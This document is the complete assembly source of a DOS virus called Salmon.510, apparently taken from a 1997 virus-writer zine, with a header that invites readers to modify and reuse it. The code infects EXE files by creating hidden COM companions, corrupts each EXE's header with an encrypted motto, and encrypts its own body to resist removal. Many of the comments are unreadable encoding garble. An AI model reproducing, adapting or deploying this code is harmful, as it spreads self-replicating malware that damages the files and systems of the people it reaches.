;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
;
;                        Salmon.510 virus                       CVC #01, 97/06
;                        ****************
;
;  ���q : Salmon.510
;  �A�b�a : Nemisis
;  ���� : Osiris of CVC,Corea / 1997.05
;  ���A : ���w���w  �e�e�w
;  �� : Nemesis Issue #01
;
; Happy Salmon - Like fish, we spawn and die.
; Spawning, Encrypted EXE Infector
;
; This virus is silly. It has no purpose, point, or meaning. I was bored
; and felt like making something. It lacks any real content or even a
; decent directory traversal routine. Adding one would make the virus more
; effective at spreading. At 510 bytes, the virus tips the scales.
;
; Upon finding an EXE file to infect the virus creates a COM companion file.
; It then proceeds to copy over the first 16 bytes of the file with the motto.
; Without the COM file to fix-up the EXE at runtime the EXE's are effectively
; trashed. The virus is encrypted to prevent easily making a patch to remove
; the virus from afflicted EXE programs. There is no "destructive" code so
; to speak.
;
; Feel free to mod/rip; that's why you have it!
;
;<><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><><>
code    segment public 'code'
        assume  cs:code,ds:code,es:code,ss:code
        org     100h
        jumps

start:
       call     encrypt                 ; �qѡ Ή��

virus:
       mov      byte ptr flag,1         ; Fixup!
       call     fixup_fuckup            ;

       mov      bx,offset endheap       ; �a����a�� �{
       shr      bx,4                    ; ́�a�a��ϡ �e�ᝡ �a��
       inc      bx                      ; +1
       mov      ah,4Ah                  ; �A���� �a�� ������
       int      21h                     ;

       mov      stackseg,ss             ; �aȂ ��w (SS:SP)
       mov      stackptr,sp             ;

       mov      sp,offset endheap-offset start+100h ; SP ������

; Int 2Eh - SI Offset 0 = Size of String Not Including CR
;           SI Offset 1 = String (gotta love that interrupt guide)

       mov      si,offset spawn          ; �e�e���q
       int      2Eh                      ; ��З

       mov      ss,stackseg              ; Stack ����
       mov      sp,stackptr

       push     cs                      ; cs=ds=es
       pop      ds
       push     cs
       pop      es

       mov      byte ptr flag,0         ;
       call     fixup_fuckup            ; Fuckup!

       mov      ah,47h                  ; �e�� ���Bɡ�� �苡
       xor      cx,cx
       mov      si,offset curdir
       int      21h

       mov      ah,2Ch                  ; �qѡ�� �i �t �苡
       int      21h
       mov      word ptr encval,dx

       mov      dx,offset dta           ; ������ DTA ���
       mov      ah,1Ah
       int      21h

       mov      dx,offset exespec       ; EXE �a�� �x��
       mov      ah,4Eh                  ; (*.E*)

find_file:
       int      21h
       jc       drop_dir

       call     baby_maker              ; ���� �e COM �a�� ����

       cmp      byte ptr run,3          ; 3 ���i �q�q���v�a ?
       jge      quit

find_next:
       mov      ah,4Fh                  ; �a�q �a�� �x��
       jmp      short find_file

drop_dir:
       mov      ah,3Bh                  ; �w�� ���Bɡ���� ����
       mov      dx,offset dotdot
       int      21h
       jc       quit
       ret

baby_maker:

       mov      si,offset dta+30        ;
       mov      di,offset asciiz        ;
asc:
       lodsb
       stosb
       cmp      al,0                    ; �{ ?
       jne      asc

       mov      si,offset dta+30
       mov      di,offset spawn+1
       mov      dx,di
       xor      ax,ax

exe2com:
       lodsb                            ; SI->AL
       stosb                            ; AL->DI
       inc      ah                      ; �w�a
       cmp      al,'.'                  ; �¸w�a ��a
       jne      exe2com

       mov      word ptr [di],'OC'      ; COM ���� ����
       mov      word ptr [di+2], 04Dh   ;

       add      ah,3                    ; For Extension
       mov      byte ptr offset spawn,ah

       mov      cx,00100011b            ; ���� ���q�� COM �a�� ����
       mov      ah,05Bh                 ; 3Ch �� �a�a�A �����w�e �a���� �����a
       int      21h                     ; �e ��́�e�a.
       jc       find_next               ; �a���� ���� �a�a ?

       inc      byte ptr run            ; �q�q�U�� �w�a
       xchg     bx,ax                   ; BX = �a�� Ѕ�i

       mov      word ptr [di], 'XE'     ;
       mov      word ptr [di+2], 0D45h  ; CR+'E' Make Back Into EXE File

       mov      ah,40h                  ; �a��
       mov      dx,offset start
       mov      cx,offset virus-start
       int      21h                     ;

       inc      word ptr encval         ;

       mov      byte ptr flag,0         ;
       call     fixup_fuckup

       call     q_encrypt               ; �qѡ�� & �a��

       mov      ah,03Eh                 ; �a�� �h��
       int      21h                     ;
       jmp      short quit

fixup_fuckup:
       push     bx

       mov      dx,offset asciiz        ;
       mov      ax,3D02h                ; ���� EXE �a�� �i��
       int      21h                     ;

       xchg     bx,ax                   ; BX=�a�� Ѕ�i

       mov      ax,4200h                ; ��q�a�� ����
       xor      cx,cx                   ; (�i�A ���e �w�w�i��...)
       cwd                              ; �a�� ���e�� ���� ������a�� ͡����e
       int      21h                     ; ��q��

       cmp      byte ptr flag,1         ; flag �a 1 ���e ����
       je       fixup

       mov      ah,3Fh                  ; EXE �a���� �|���� ����
       mov      cx,28                   ; �e�e�w �a����a�����e �e��ӡ COM �a��
       mov      dx,offset bbyte         ; �i �A�� �a�e ���e�a���e á�a �i ����
       int      21h                     ; �a. ���� EXE �a���� �|�����i �e�e�E
                                        ; COM �a�� �����A ��w�a�� �������a.
       mov      ax,4200h                ;
       xor      cx,cx                   ;
       cwd                              ;
       int      21h                     ; �a���� ��a�� ����

       mov      cx,14                   ;
       mov      si,offset motto         ;
       mov      di,offset xorred_motto  ;
       mov      dx,sp                   ; An Nice Way to Get Encrypt Value

fuck_motto:
       lodsw                            ;
       xor      ax,dx                   ; �qѡ��
       stosw                            ;
       loop     fuck_motto              ;

       mov      ah,40h
       mov      dx,offset xorred_motto
       mov      cx,28
       int      21h                     ; Overwrite 28 Bytes With Motto
       jmp      short close

fixup:
       mov      ah,40h                  ; ���� �|���� ����
       mov      dx,offset bbyte
       mov      cx,28
       int      21h                     ;
close:
       mov      ah,03Eh
       int      21h
       pop      bx
       ret

quit:

       mov      ah,3Bh                  ; ���� ���Bɡ���� ����
       mov      dx,offset curdir
       xor      cx,cx
       int      21h

       mov      ah,4Ch                  ; �{����
       int      21h

exespec   db     '*.E*',0               ; EXE �a�� �x��
spawn     db     13,13 dup(0),13        ; �a�� ���q

vname     db    '[Happy Salmon]'        ; �a����a ���q
vwhom     db    '[Nemesis]'             ; �A�b�a
vwhere    db    '[USA]'                 ; �A�b��
motto     db    'Like fish, we spawn and die.'
bbyte     db     28 dup (0)
asciiz    db     13 dup (0)
dotdot    db    '..',0                  ; �w�� ���Bɡ���� ����

;
;
q_encrypt:
       mov      si,offset move_str      ;
       mov      di,offset space         ;
       mov      cx,offset move_end-move_str
       rep      movsb                   ; Move The Next Routine Into
                                        ; Memory
       mov      dx,offset space
       call     dx                      ; Call The Copied Routine
       ret

move_str:
       mov      dx,offset encrypt
       call     dx                      ; �qѡ��

       mov      dx,offset virus         ; �a����a �a��
       mov      cx,offset heap-virus    ; ����
       mov      ah,40h
       int      21h                     ; �a��

       mov      dx,offset encrypt
       call     dx                      ; �qѡ Ή��
       ret
move_end:

encrypt:
       mov      di,word ptr encval      ;
       mov      si,offset virus
       mov      cx,(offset move_end-offset virus)/2
xorit:
       xor      word ptr [si],di
       inc      si
       inc      si
       loop     xorit
       ret
encval    dw     0

;------------[���a�a�A ��w�e�A�e ����]--------------------------------------
heap:
dta              db     42   dup (?)           ; New DTA
stackseg         dw     ?
stackptr         dw     ?
space            db     offset move_end-offset move_str dup(?)
run              db     ?
flag             db     ?
curdir           db     64  dup (?)
xorred_motto     dw     14  dup  (?)
endheap:

code ends
end start
